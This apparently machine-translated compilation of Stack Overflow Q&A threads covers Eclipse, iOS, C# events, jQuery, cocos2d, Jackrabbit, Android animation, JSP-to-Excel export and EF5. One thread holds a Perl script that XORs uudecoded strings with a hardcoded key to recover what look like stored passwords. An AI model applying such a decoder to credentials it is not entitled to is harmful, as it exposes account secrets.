> 标签：eclipse, eclipse-plugin

随着断点数量在开发阶段或调试单个问题期间的增加，通常需要在移动到另一个问题/阶段时清除所有当前断点。

有没有办法拥有第二个断点选项卡，其中永久断点可以保持不变，即对于间歇性问题，我们有时会在修复许多其他问题时保持断点处于活动状态......这使得清除所有断点成为真正的麻烦

布赖恩

PS我知道使用日志记录而不是这些长期断点

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:42:05.613

您可以在工作集中对断点进行分组和分配以实现此目的：

![在此处输入图像描述](../Images/8b687719c007f25c9f76934d4ba0e77d.png)

此外，您可以导出或导入它们以在项目之间传输断点或将它们与您的项目一起存储。

# ios - 网络上的 iOS 图像搜索

> ID：14977919
> 
> 赞同：0
> 
> 时间：2013-02-20T10:46:17.787
> 
> 标签：ios, image, search, web

我正在开发让用户通过任何查询在互联网上搜索图像的功能。

有像 Google 的服务/API（我读到它已被弃用）、Yahoo 和 Bing 等。我想知道，`FREE`iOS 是否有任何服务/API/框架/库可以针对任何查询搜索图像？

我们可以根据结果 URL 获取缩略图并填充网格视图以显示缩略图。然后在用户单击特定图像后在应用程序中下载实际图像。有没有这样免费的服务？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:52:50.157

您可以使用 flickr，在[Ray Wenderlich 网站上](http://www.raywenderlich.com/22324/beginning-uicollectionview-in-ios-6-part-12)，您有一个很好的使用教程。关于您提到的服务，我不知道是否有公共（免费）API

# c# - 如何在 EventArgs 中传递对象

> ID：14977927
> 
> 赞同：39
> 
> 时间：2013-02-20T10:46:54.527
> 
> 标签：c#, eventargs

我有一个用户控件，它在与 Web 服务通信后引发事件。父级在引发时处理此事件。我*认为*正确的方法是将 web 服务返回的对象作为 eventargs 传递给父对象？？？

如果这是正确的方法，我似乎找不到有关如何执行此操作的说明。

> 用户控制

```
public event EventHandler LoginCompleted; 
```

然后在服务返回 biz 对象之后：

```
if (this.LoginCompleted != null)
        {
            this.LoginCompleted(this, new EventArgs() //this is where I would attach / pass my biz object no?);  
        } 
```

> 家长

```
ctrl_Login.LoginCompleted += ctrl_Login_LoginCompleted;
....snip....
void ctrl_Login_LoginCompleted(object sender, EventArgs e)
    {
        //get my object returned by login
    } 
```

所以我的问题是将用户对象返回给父对象的“批准”方法是什么？创建一个所有东西都可以访问的属性类并将其放在那里？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2013-02-20T10:48:49.483

您必须使用`EventHandler<T>`where `T`is your class that derived from声明您的事件`EventArgs`：

```
public event EventHandler<LoginCompletedEventArgs> LoginCompleted; 
```

`LoginCompletedEventArgs`可能看起来像这样：

```
public class LoginCompletedEventArgs : EventArgs
{
    private readonly YourBusinessObject _businessObject;

    public LoginCompletedEventArgs(YourBusinessObject businessObject)
    {
        _businessObject = businessObject;
    }

    public YourBusinessObject BusinessObject
    {
        get { return _businessObject; }
    }
} 
```

用法是这样的：

```
private void RaiseLoginCompleted(YourBusinessObject  businessObject)
{
    var handler = LoginCompleted;
    if(handler == null)
        return;

    handler(this, new LoginCompletedEventArgs(businessObject));
} 
```

请注意我是如何实现`RaiseLoginCompleted`的。这是引发事件的线程安全版本。我消除了`NullReferenceException`在一个线程想要引发事件而另一个线程在`if`检查之后但在实际调用处理程序之前取消订阅最后一个处理程序的竞争条件场景中可能发生的可能性。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2016-01-14T02:39:24.620

好吧，你可以做所有这些，或者你可以定义一个委托作为你的 EventHandler 并在它的签名中定义你的属性。

如：

```
public delegate void MyEventEventHandler(int prop1, string prop2, object prop3...);

public event MyEventEventHandler MyEvent; 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2018-10-04T17:00:20.770

我个人喜欢 Toni Petrina 的方法（参见[https://coderwall.com/p/wkzizq/generic-eventargs-class](https://coderwall.com/p/wkzizq/generic-eventargs-class)）。它与公认的答案不同，因为您不必创建特殊的 EventHandler 类（例如`LoginCompletedEventArgs`）。

（*注意*：我使用的是 VS 2015 和 C# v6。在旧版本的 Visual Studio 和 C# 中，您可能需要添加`using System.Linq;`）

创建一个从 EventArgs 继承的通用 EventArgs<T> 类**...**

```
class EventArgs<T> : EventArgs {

  public T Value { get; private set; }

  public EventArgs(T val) {
     Value = val;
  }

} 
```

声明您的事件处理程序**...**

```
public event EventHandler<EventArgs<object>> LoginCompleted; 
```

假设您已声明并分配了一个名为 的对象`loginObject`，请添加代码以引发您的事件**...**

```
private void RaiseLoginCompleted() {
  if (LoginCompleted != null)
    LoginCompleted(this, new EventArgs<object>(loginObject));
} 
```

在您的客户端代码中，添加`LoginCompleted`事件处理程序（使用 Linq 并调用本地方法）**...**

```
LoginCompleted += (o, e) => onLoginCompleted(e.Value); // calls a local method

void onLoginCompleted(LoginObject obj) {
  // add your code here
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2020-04-28T07:49:19.567

我建议将[命名元组](https://docs.microsoft.com/en-us/dotnet/csharp/tuples)与`EventHandler<TEventArgs>`.

我喜欢老狗的[回答](https://stackoverflow.com/a/52651996/4100915)。Microsoft 已经有了这个委托[EventHandler< TEventArgs >](https://docs.microsoft.com/en-us/dotnet/api/system.eventhandler-1?f1url=https%3A%2F%2Fmsdn.microsoft.com%2Fquery%2Fdev15.query%3FappId%3DDev15IDEF1%26l%3DEN-US%26k%3Dk(System.EventHandler%601)%3Bk(TargetFrameworkMoniker-.NETFramework%2CVersion%3Dv4.6.1)%3Bk(DevLang-csharp)%26rd%3Dtrue%26f%3D255%26MSPPError%3D-2147217396&view=netframework-2.0)。

```
public delegate void EventHandler<TEventArgs>(object sender, TEventArgs e); 
```

您不需要继承自`EventArgs`.

使用命名元组声明您的事件处理程序。

```
public event EventHandler<(int id, string message, object LoginObject)> LoginCompleted; 
```

在您的客户端代码中，将方法分配给 LoginCompleted 事件处理程序

选项 1：使用 lambda

```
LoginCompleted  += (o, e) =>
{
    Console.WriteLine($"Hello, sender is {o.ToString()}! id is {e.id}, message is {e.message}, and LoginObject is {e.LoginObject.ToString()}. ");
}; 
```

选项 2：调用本地方法

```
LoginCompleted  += onLoginCompleted;

private static void onLoginCompleted  (object sender, (int id, string message,  object LoginObject) e)
{
    Console.WriteLine($"Hello, sender is {sender.ToString()}! id is {e.id}, message is {e.message}, and LoginObject is {e.LoginObject.ToString()}. ");
} 
```

我只是写了一个例子，请参考我的[repo](https://github.com/jk9112605/EvntArgsWithTuple/tree/master)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2020-01-01T12:01:58.273

有时创建一个仅将 bool 作为派生类传递的类很糟糕`EventArgs`！所以你可以简单地使用`Action`而不是`EventHandler`. 您可以传递任何类型和您喜欢的参数数量（Action 最多支持 16 个）。

```
 class Raiser
    {
        public event Action<Raiser, bool,DateTimeOffset> OnCreate;

        public void Create()
        {
            OnCreate?.Invoke(this, true,DateTimeOffset.Now);
        }
    }

    class Listener
    {
        Raiser raiser;

        public Listener()
        {
            raiser = new Raiser();
            raiser.OnCreate += Raiser_OnCreate;
        }

        private void Raiser_OnCreate(Raiser arg1, bool arg2,DateTimeOffset dateTimeOffset)
        {
            throw new NotImplementedException();//Do Your works here
        }
    } 
```

通常 using`Action`和 'Func' 比`Delegate`.

# jquery - 使用 json 配置数据表时出错

> ID：14977931
> 
> 赞同：0
> 
> 时间：2013-02-20T10:47:08.167
> 
> 标签：jquery, plugins, datatable

我有一张桌子如下

```
<table cellpadding="0" cellspacing="0" border="0" class="display" id="example">
<thead>
    <tr>
        <th>Month</th>
        <th>ID</th>
        <th>Comments</th>
        <th>Details</th>
    </tr>
</thead>
<tbody>
</tbody>
</table> 
```

我的json是

```
[{
"Month": "Jan-2013",
"ID": "asdfa0",
"Comments": "",
"Details": "bla bla blba blablabalbal"
}] 
```

我的脚本是

```
$(document).ready(function () {
var oTable = $('#example').dataTable({
    "bProcessing": true,
    "sAjaxSource": "Script/ahd.json",
    "aoColumns": [
    { "mData": "Month" },
    { "mData": "ID" },
    { "mData": "Comments" },
    { "mData": "Details" }
    ]
});
}); 
```

这样做后，我收到以下错误

未捕获的类型错误：无法读取未定义 jquery.dataTables.js:2649 的属性“长度”

经过一番谷歌搜索后，我得到了 1 个将 json 包装起来的解决方案

```
{
  aaData: 
  [{
"Month": "Jan-2013",
"ID": "asdfa0",
"Comments": "",
"Details": "bla bla blba blablabalbal"
}]
} 
```

这也不起作用......这里有什么问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:29:02.383

阅读文档

你的js必须是

```
$(document).ready(function() {
                $('#example').dataTable( {
                    "bProcessing": true,
                    "bServerSide": true,
                    "sAjaxSource": "Script/ahd.json",
                    "sServerMethod": "POST"
                } );
            } ); 
```

而且json格式一定是这样的

```
{
  "sEcho": 3,
  "iTotalRecords": 6,
  "iTotalDisplayRecords": 3,
  "aaData": [
    [
      "A","B","C"
    ],
    [
       "A","B","C"
    ],
    [
        "A","B","C"
    ],
    [
        "A","B","C"
    ],
    [
       "A","B","C"
    ],
    [
       "A","B","C"
    ],
   ]

} 
```

# cocos2d-iphone - 我应该在 cocos2d 游戏中将小图像缩放到其他形式吗？

> ID：14977933
> 
> 赞同：0
> 
> 时间：2013-02-20T10:47:10.840
> 
> 标签：cocos2d-iphone, sprite, ios-universal-app

我有一个用 cocos2d-iphone 构建的**通用**iOS 游戏，其中包含*大量**小*图像（以及其他图像）。对于这些小图像，游戏在 iphone:ipad/iphone-retina:ipad-retina 的 1:2:4 比例下运行良好。我有两种方法可以在游戏中启用此功能：

A) 拥有三组 sprites/spritesheets - 对于所需的三种形式因素，并适当地命名它们并拾取图像

B）拥有一组最高分辨率的图像，然后根据设备及其分辨率进行缩放`aSprite.scale=[self getScaleAccordingToDevice];`

选项 A 的优点是运行时开销较小，但会占用大量磁盘空间（这是一个重要的考虑因素，因为应用程序目前约为 94 MB）。选项 B 的优点是磁盘占用空间更小，但代价是即使对于 iphone 3gs（支持的最低设备），ipad 视网膜图像也会加载到内存中。

有人可以提供有助于我决定一种或另一种方式的论据吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T16:25:33.710

**没有论据：使用选项 A。**

选项 B 绝对不可能，因为您将在具有 iPad 3 或 4 (256 MB 与 1 GB）。更不用说渲染如此大图像的缩小版本所需的额外处理能力了。由于内存不足和运行速度太慢，它很有可能根本不起作用（你试过吗？）。

接下来，按理说，在 95 MB 时，如果使用选项 B，您的应用程序可能仍然不会低于 50 MB。大的 Retina 纹理占包大小的三分之二或四分之三，SD 纹理的重量并不大。这是您应该考虑的唯一应用程序包大小目标，因为低于 50 MB 的用户可以通过无线方式下载您的应用程序，超过 50 MB 的用户必须通过 Wifi 同步或连接到计算机。如果您不能低于 50 MB，那么您的捆绑包大小是 55 MB 还是 155 MB 并不重要。

最后，还有更好的选择来减小捆绑包的大小。[阅读我的文章](http://www.learn-cocos2d.com/2012/11/optimize-memory-usage-bundle-size-cocos2d-app/)，尤其是第二部分。

如果您的图像是 PNG，您应该尝试的第一件事是将它们全部转换为 .pvr.ccz 和 NPOT 纹理图集（最简单的方法：[TexturePacker](http://www.texturepacker.de)）。您可以在不损失图像质量的情况下将捆绑包大小减少多达 30-50%。如果您*可以*承受损失一些图像质量，则可以节省更多（加上额外的加载和性能改进）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T13:41:51.153

好吧，在 94Mb 上，您的应用程序已经超出了电话网络的下载限制，即只有在某些互联网连接可用时才会下载它。所以……这真的是个问题吗？您需要考虑的另一个重要因素是运行时的内存占用。如果您在 3G 上运行 4 倍并按比例缩小，内存需求仍将是完整大小的精灵（即 16 倍内存量:)。因此，您必须问自己的另一个问题是，该游戏是否可能在旧设备上以高内存占用“运行”。此外，纹理的加载时间可能足以影响您的应用在旧设备上的可用性。您需要衡量这些事情并根据一些硬数据做出决定（不幸的是）。

您需要做的第一个测试是查看您的“缩小”精灵在标准分辨率的 iphone 上是否正常。缩小有时在渲染时达不到预期。如果你的平面设计师拒绝选项 B，你就没有决定权。他/她有责任提供所有 3 种格式。之后，如果选项 B 仍然是一个选项，我将从选项 B 开始，并在 3GS 上进行测量（小型项目，而不是完整的实施）。如果一切顺利，你就完成了。

ps：对于应用程序大小，请考虑使用 .pvr.ccz 格式（我使用纹理打包器）。更小的纹理和更快的加载时间（因为 pvr 格式）。由于通常较慢的处理器 - 需要解压缩，3GS 上的加载时间改进可能较小。

# jquery - $.ajax().fail()

> ID：14977934
> 
> 赞同：0
> 
> 时间：2013-02-20T10:47:13.153
> 
> 标签：jquery

我想知道什么样的原因会导致 $.ajax() 请求失败？我没有机会看到任何东西，因为到目前为止我的代码运行良好，但我真的需要了解它们。让我来告诉你为什么！假设 $.ajax 请求失败是有原因的。jQuery 让我有机会在这种情况下通过 .fail() 做某事。我可以尝试在 .fail() 内重复/重新发送请求吗？请求失败的原因，是否会再次发生？如果是这样，那么每次我重新发送请求并粉碎应用程序/代码时都会发生吗？

# javascript - 如何指定备用 panelContext - EasyTabs

> ID：14977936
> 
> 赞同：0
> 
> 时间：2013-02-20T10:47:20.027
> 
> 标签：javascript, ajax

我在我的网站上使用 Alfa Jango 的 EasyTabs 插件，并希望将面板与选项卡分开。他在文档中说明了我想要做什么；

> 如果您指定了一个备用 panelContext，您的面板也可以完全位于 DOM 中的其他位置（在您的选项卡容器之外）。
> 
> panelContext 是任何 jQuery DOM 元素，easytabs 将在其中查找面板。默认情况下，它是调用 easytabs() 的容器。

所以，我知道我必须指定 panelContext，比如说，在 div#disconnected 中查找面板。

这是我尝试过的，但没有任何效果......

```
<script type="text/javascript">
    $(document).ready( function() {
        $('#tab-container').easytabs({
            panelContext: '#disconnected';
        });
    });
</script> 
```

或尝试更改 $container...

```
<script type="text/javascript">
    $(document).ready( function() {
        $('#tab-container').easytabs({
            $container: '#disconnected'  
        });
    });
</script> 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-14T03:09:49.920

我和你有同样的问题，找到了答案：

您应该键入：

```
<script type="text/javascript">
$(document).ready( function() {
    $('#tab-container').easytabs({
    panelContext: $('div#disconnected')
    });
}); 
```

在这里查看代码后发现：[Easy Tabs Github](https://github.com/JangoSteve/jQuery-EasyTabs/issues/129)

希望能帮助到你

# derby - 如何动态更改 Jackrabbit 持久性管理器？

> ID：14977938
> 
> 赞同：1
> 
> 时间：2013-02-20T10:47:27.697
> 
> 标签：derby, jackrabbit, file-storage

我使用了基于 derby DB 的内部持久性管理器和文件系统存储库。

现在它在 repo 中有大约 150 万个文件和 3 TB，在 derby DB 中有大约 600 万条记录。

我认为对于那个数据库来说太多了，因为我上次的性能非常慢。

所以我想将持久性管理器更改为 MySQL 或 Oracle 之类的东西。

从 Apache Jackrabbit derby DB 导出数据并导入 MySQL 的最佳方法是什么？

我怎样才能以最简单和最快的方式做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T16:53:14.567

[备份和迁移](http://wiki.apache.org/jackrabbit/BackupAndMigration)页面描述了如何迁移到 Jackrabbit 版本或新的[持久性管理器。](http://wiki.apache.org/jackrabbit/PersistenceManagerFAQ)

以我的经验，MySQL 或 Oracle 实际上并不快，是 Derby 是嵌入的（进程内）。MySQL 和 Oracle 是远程的，因此对于每个请求都有一个网络往返。

相反，您可以做的是使用更高的[捆绑缓存大小](http://jackrabbit.apache.org/api/1.5/org/apache/jackrabbit/core/persistence/bundle/BundleDbPersistenceManager.html)和/或更高的数据库缓存大小。

# android - 画布动画

> ID：14977940
> 
> 赞同：0
> 
> 时间：2013-02-20T10:47:37.157
> 
> 标签：android, animation, canvas, surfaceview

我四处寻找帮助，但找不到任何答案。目前，当我想在表面视图中为球设置动画时，我调用了一个方法：

1.  将surfaceview中的动画变量设置为扩展AnimationModule（扩展AnimationSet）的自定义类，该类在每次绘制时更改球的属性

2.  然后在每次绘制时调用它，直到 AnimationModule 达到其 maxCount，此时它调用其继承的 AnimationListener.onAnimationEnd

3.  surfaceview 接收到这个回调，然后将动画变量声明为 null，这样它就不会再在每次绘制时调用它了

目前这工作还不错，但感觉非常糟糕和笨拙 - 我真的很想使用其他人使用的久经考验的方法，因为我对动画非常陌生。

另一个问题是我必须使用扩展 view.animation 的动画，所以 ScaleAnimation、TranslateAnimation 等。这对于在屏幕上移动球来说很好，但是当我遇到更复杂的事情时，比如用它的透视动画canvas.polyToPoly 我必须为这种情况创建一个扩展 view.animation 的新类，或者不使用它。

动画模块类：

```
public abstract class AnimationModule extends AnimationSet{

protected AnimationListener listener;
protected CreatureView attacker;
protected CreatureView defender;
protected BattleCanvas canvas;
protected long increment=0;
protected long individualIncrement=0;
protected float interpolation=0;
private boolean finished=false;
private ArrayList<Animation> animations = new ArrayList<Animation>();
private int currentAnimation=0;
private long totalTime=0;

public interface OnAnimationFinishedListener{
    public void OnAnimationFinished();
}

public AnimationModule(boolean shareInterpolator){
    super(shareInterpolator);
    init();
}

public void setCanvas(BattleCanvas canvas){
    this.canvas=canvas;
}

public void setCreatures(CreatureView attacker, CreatureView defender){
    this.attacker=attacker;
    this.defender=defender;
    Log.i("anim","attacker :"+String.valueOf(attacker.getCreature().getBaseName()));
}

public AnimationModule(boolean shareInterpolator, AnimationController controller){
    super(shareInterpolator);

}

private void init(){

    setFillAfter(true);

}
public boolean isFinished(){
    return finished;
}

@Override
public void addAnimation(Animation a){
    Log.i("Animation","adding animation");
    animations.add(a);
    computeDuration();
    //super.addAnimation(a);
    finished=false;
}

@Override
public void setAnimationListener(AnimationListener a){
    super.setAnimationListener(a);
    this.listener=a;
}

@Override
public boolean getTransformation(long increment, Transformation transform){
    //super.getTransformation(increment, transform);
    if(animations.size()>currentAnimation)
    animations.get(currentAnimation).getTransformation(individualIncrement, transform);
    return true;
}

public void draw(){

}

public void update(){
    if(animations.size()>0){
    Log.i("Animation",String.valueOf(individualIncrement));
    Log.i("Animation",String.valueOf((animations.get(currentAnimation).getRepeatCount()+1)));
    Log.i("Animation",String.valueOf(animations.get(currentAnimation).getDuration()));
    if(individualIncrement>animations.get(currentAnimation).getDuration()*(animations.get(currentAnimation).getRepeatCount()+1)){
        if(animations.size()>currentAnimation+1){
            currentAnimation++;
            individualIncrement=0;
        }else{
            finished();
            return;
        }
    }
    Log.i("module","on animation "+String.valueOf(currentAnimation));

    increment();
    if(increment>=getDuration()){
        finished();

    }
    }
}

protected long computeDuration(){
    long duration=0;
    Iterator<Animation> iterator = animations.iterator();
    while (iterator.hasNext()) {
        Animation a = iterator.next();
        duration=duration+a.computeDurationHint();
    }
    totalTime=duration;
    setDuration(duration);
    Log.i("Animation","duration set to "+String.valueOf(duration));
    return duration;
}

private void finished(){
    finished=true;
    if(listener!=null)
    listener.onAnimationEnd(this);
}

private void increment(){
    increment++;
    individualIncrement++;
    if(getDuration()!=0){
    float far = increment/getDuration();
    interpolation=far;      
    }
    else
        interpolation=0;
}

} 
```

扩展 AnimationModule 的示例动画：

```
class BiteAnimation extends AnimationModule{

    private float fromSy;
    private float fromSx;
    private ColorAnimation flash;

    public BiteAnimation(boolean shareInterpolator){
        super(shareInterpolator);

    }

    @Override
    public void setCanvas(BattleCanvas canvas){
        super.setCanvas(canvas);

    fromSy=defender.getSy();

        fromSx=defender.getSx();

        ScaleAnimation scale = new ScaleAnimation(fromSx,fromSx,fromSy,fromSy/2, defender.size/2, defender.size/2);

        scale.setDuration(50);
        scale.setRepeatMode(2);
        scale.setRepeatCount(1);

        addAnimation(scale);

         flash = new ColorAnimation(defender.getAdd(), Color.WHITE, ColorAnimation.TYPE_ADD, defender);
         flash.setDuration(50);
         flash.setRepeatMode(2);
         flash.setRepeatCount(1);

    }

    @Override
    public void update() {
        super.update();
         Transformation t = new Transformation();

         Log.i("Animation","increment: "+String.valueOf(individualIncrement));
                    getTransformation(individualIncrement, t);
                    defender.getMatrix().postConcat(t.getMatrix());

               flash.getTransformation(individualIncrement, null);

    }

} 
```

如您所见，自定义 animationModule 只是将其转换应用于它正在转换的画布的对象（在本例中为防御者）。然后在表面视图上绘制防御者时使用此画布。

就像我说的，这感觉真的很糟糕，我可以在如何实现对象动画方面提供一些帮助。

# html - 如何将 JSP 表导出为 EXCEL（XLSX 格式）

> ID：14977943
> 
> 赞同：0
> 
> 时间：2013-02-20T10:47:45.000
> 
> 标签：html, jsp, format, export-to-excel, suppress-warnings

```
 <%@ page language="java" contentType="application/vnd.ms-excel"%>
   <% response.setHeader("Content-Disposition:","attachment;filename=Sample.xls"); %> 
 <TABLE>
  <TR><TD>2</TD></TR>
    <TR><TD>3</TD></TR>
   <TR><TD>5</TD></TR>
    </TABLE> 
```

如何以 XLSX 格式导出 JSP 表以及如何抑制以下异常
您尝试打开`name.ext`的文件 , 与文件扩展名指定的格式不同。在打开文件之前，请确认文件没有损坏并且来自受信任的来源。您现在要打开文件吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:25:24.820

用这个

html代码

```
 <!DOCTYPE html>
    <html>
    <head>
      <title>tableToExcel Demo</title>
      <script>
 var tableToExcel = (function() {
      var uri = 'data:application/vnd.ms-excel;base64,'
        , template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--></head><body><table>{table}</table></body></html>'
        , base64 = function(s) { return window.btoa(unescape(encodeURIComponent(s))) }
        , format = function(s, c) { return s.replace(/{(\w+)}/g, function(m, p) { return c[p]; }) }
      return function(table, name) {
        if (!table.nodeType) table = document.getElementById(table)
        var ctx = {worksheet: name || 'Worksheet', table: table.innerHTML}
        window.location.href = uri + base64(format(template, ctx))
      }
    })()
</script>
    </head>
    <body>

    <h1>tableToExcel Demo</h1>
    <p>Exporting the W3C Example Table</p>

    <input type="button" onclick="tableToExcel('testTable', 'W3C Example Table')" value="Export to Excel">

    <table id="testTable" summary="Code page support in different versions of MS Windows." rules="groups" frame="hsides" border="2"><caption>CODE-PAGE SUPPORT IN MICROSOFT WINDOWS</caption><colgroup align="center"></colgroup><colgroup align="left"></colgroup><colgroup span="2" align="center"></colgroup><colgroup span="3" align="center"></colgroup><thead valign="top"><tr><th>Code-Page<br>ID</th><th>Name</th><th>ACP</th><th>OEMCP</th><th>Windows<br>NT 3.1</th><th>Windows<br>NT 3.51</th><th>Windows<br>95</th></tr></thead><tbody><tr><td>1200</td><td style="background-color: #00f; color: #fff">Unicode (BMP of ISO/IEC-10646)</td><td></td><td></td><td>X</td><td>X</td><td>*</td></tr><tr><td>1250</td><td style="font-weight: bold">Windows 3.1 Eastern European</td><td>X</td><td></td><td>X</td><td>X</td><td>X</td></tr><tr><td>1251</td><td>Windows 3.1 Cyrillic</td><td>X</td><td></td><td>X</td><td>X</td><td>X</td></tr><tr><td>1252</td><td>Windows 3.1 US (ANSI)</td><td>X</td><td></td><td>X</td><td>X</td><td>X</td></tr><tr><td>1253</td><td>Windows 3.1 Greek</td><td>X</td><td></td><td>X</td><td>X</td><td>X</td></tr><tr><td>1254</td><td>Windows 3.1 Turkish</td><td>X</td><td></td><td>X</td><td>X</td><td>X</td></tr><tr><td>1255</td><td>Hebrew</td><td>X</td><td></td><td></td><td></td><td>X</td></tr><tr><td>1256</td><td>Arabic</td><td>X</td><td></td><td></td><td></td><td>X</td></tr><tr><td>1257</td><td>Baltic</td><td>X</td><td></td><td></td><td></td><td>X</td></tr><tr><td>1361</td><td>Korean (Johab)</td><td>X</td><td></td><td></td><td>**</td><td>X</td></tr></tbody><tbody><tr><td>437</td><td>MS-DOS United States</td><td></td><td>X</td><td>X</td><td>X</td><td>X</td></tr><tr><td>708</td><td>Arabic (ASMO 708)</td><td></td><td>X</td><td></td><td></td><td>X</td></tr><tr><td>709</td><td>Arabic (ASMO 449+, BCON V4)</td><td></td><td>X</td><td></td><td></td><td>X</td></tr><tr><td>710</td><td>Arabic (Transparent Arabic)</td><td></td><td>X</td><td></td><td></td><td>X</td></tr><tr><td>720</td><td>Arabic (Transparent ASMO)</td><td></td><td>X</td><td></td><td></td><td>X</td></tr></tbody></table>

    </body>
    </html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-08-03T06:20:53.947

使用这种方式：

```
<%@ page import="java.sql.* "  %>       
<%
response.setContentType("application/vnd.ms-excel");
response.setHeader("Content-Disposition", "attachment; filename=SimDetails.xls");

Connection con = null;
PreparedStatement ps=null;
ResultSet  rs   = null;
%>
<%@ include file="directconnection.jsp"%>

<%
int simid=0;
int net=0;
String sim="";
String mob="";
String contnum="";
String couridate="";
String sendaddr="";
String networkName="";
String contpe="";

try{
    %>      
    <table>
        <tr>
            <th width="5%">SNo</th>
            <th width="30%;">Network</th>
            <th width="30%;">Sim Number</th>
            <th width="30%;">Mobile Number</th>
            <th width="30%;">Sender Address</th>
            <th width="30%;">Contact Person Number</th>
            <th width="30%;">Contact Person Name</th>
       </tr>
       <%
        String strSimExportQuery=" SELECT SM_SIM_ID,SM_PROVIDER_ID,SM_SIM_NUMBER,SM_MOBILE_NUMBER,"+
                                               " SM_SENDER_ADDRESS,SM_CONTACT_PERSON_NO,SM_CONTACT_PERSON FROM RS_SIM_MASTER "; 
        ps=con.prepareStatement(strSimExportQuery);
        rs=ps.executeQuery();
        while(rs.next()){
            simid++;
            net=rs.getInt("SM_PROVIDER_ID");
            if(net==1){
                networkName="Vodafone";
            }

            sim=rs.getString("SM_SIM_NUMBER");
            mob=rs.getString("SM_MOBILE_NUMBER");
            sendaddr=rs.getString("SM_SENDER_ADDRESS");
            contnum=rs.getString("SM_CONTACT_PERSON_NO");
            contpe=rs.getString("SM_CONTACT_PERSON");
            %>
            <tr>
                <td><%=simid%></td>
                <td><%=networkName%></td>
                <td><%=sim%></td>
                <td><%=mob%></td>
                <td><%=sendaddr%></td>
                <td><%=contnum%></td>
                <td><%=contpe%></td>
            </tr>
            <%}%>
         </table>
           <%
            }catch(Exception e){
                    out.println(e);
               }
                finally {
                    if (rs!= null){ rs.close(); rs=null;}
                    if(ps!=null){ps.close();ps=null;}
                    if (con != null) {con.close();con = null;}
            }
           %> 
```

# perl - 包含“^”的 Perl XOR 转义字符串

> ID：14977946
> 
> 赞同：0
> 
> 时间：2013-02-20T10:48:02.883
> 
> 标签：perl, escaping, xor

在 Perl 中进行按位异或时，如何转义“^”字符？我的脚本没问题，但是当我输入这样的字符串时`.1M80P]/)S@*>RQF^RM< \n`，输出会变得混乱：

```
#!/usr/bin/perl

$key = pack("H*","3cb37efae7f4f376ebbd76cd");

print "Enter string to decode: ";
$str=<STDIN>;chomp $str; $str =~s/\\(.)/$1/g;
$dec = decode($str);
print "Decoded string value: $dec\n";

sub decode{
    @subvar=@_;
    my $sqlstr = $subvar[0];
    $cipher = unpack("u", $sqlstr);
    $plain = $cipher^$key;
    return substr($plain, 0, length($cipher));
} 
```

输出：

```
Enter string to decode: .1M80P]/)S@*>RQF^RM< \n
Decoded string value: zen94==tuvosÊ× 
```

奇怪的是，以下字符串`,\=_\\^M;+ D1F$U@7L\n`可以正常工作并解码为`KL@OU4books!`但又`.;H ^F8B8EQ">SA^BDL8 \n`不能按预期工作并返回`R3@coldfusioÆ`

这是 ikegami 清理后的代码（虽然结果相同）：

```
#!/usr/bin/perl
use strict;
use warnings;

sub deliteral {
   my ($s) = @_;
   $s =~ s/\\n/\n/g;
   die "Unrecognised escape \\$1\n" if $s =~ /\\[a-zA-Z0-9]/;
   $s =~ s/\\(.)/$1/sg;
   return $s;   
}

sub uudecode {
   return unpack 'u', $_[0];
}

sub decode {
   my ($key, $cipher) = @_;
   return substr($cipher^$key, 0, length($cipher)); # XXX
}

my $key = pack('H*', '3cb37efae7f4f376ebbd76cd');

print "Enter string to decode: ";
chomp( my $coded = <STDIN> );

my $cipher = uudecode(deliteral($coded));
my $plain = decode($key, $cipher);
print("Plain text: $plain\n"); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T09:35:58.433

所以这是解决方案，感谢ikegami的帮助：

```
#!/usr/bin/perl
use strict;
use warnings;

sub deliteral {
   my ($s) = @_;
   $s =~ s/\\n/\n/g;
   die "Unrecognised escape \\$1\n" if $s =~ /(?<!\\)(?:\\{2})*\\([a-zA-Z0-9])/;   $s =~ s/\\(.)/$1/sg;
   return $s;   
}

sub uudecode {
   return unpack 'u', $_[0];
}

sub decode {
   my ($key, $cipher) = @_;
   return substr($cipher^$key, 0, length($cipher)); # XXX
}

my $key = pack('H*', '3cb37efae7f4f376ebbd76cdfce7391e9ed9cee4cfceb4b33332fc96ff7b');

print "Enter string to decode: ";
chomp( my $coded = <STDIN> );

my $cipher = uudecode(deliteral($coded));
my $plain = decode($key, $cipher);
print("Plain text: $plain\n"); 
```

问题在于 KEY 的长度。

# c# - EF5 Fluent API 一对一无需导航器

> ID：14977947
> 
> 赞同：0
> 
> 时间：2013-02-20T10:48:08.723
> 
> 标签：c#, entity-framework, entity-framework-5, one-to-one

在 Fluent API EF5 中，是否可以通过 Join 表配置一对一关系（如果是个好主意，不确定）？我不需要从右到左的导航，只需要从左到右。

我想做的是这样的

```
Table A1
TableA1_ID  //Key
RankValue   //int

Table A1_Rank (join table)
TableA1_ID
RankId

Table Rank
RankId
Value 
```

POCO

```
public class A1 
{
    public int Id { get; set; }
    public decimal RankValue { get; set; }
    public virtual Rank Rank { get; set; }
}

public class Rank
{
    public int RankId { get; set; }
    public decimal Value { get, set; }
    public decimal Hits { get; set; }
} 
```

